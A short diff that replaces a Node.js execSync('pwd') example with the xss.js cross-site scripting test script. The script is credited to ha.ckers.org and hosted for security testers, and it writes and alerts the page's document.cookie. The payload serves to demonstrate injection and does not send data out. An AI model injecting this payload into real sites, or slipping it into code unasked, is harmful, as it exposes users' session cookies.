@@ -1,4 +1,7 @@
-const execSync = require('child_process').execSync;
-// import { execSync } from 'child_process';  // replace ^ if using ES modules
-const output = execSync('pwd', { encoding: 'utf-8' });  // the default is 'buffer'
-console.log('Output was:\n', output);
+/* This file is based on the file from http://ha.ckers.org/xss.js
+   It has been reproduced here due to the extended downtime of ha.ckers.org
+   This file is being hosted as a courtesy to the security community.
+*/
+
+document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
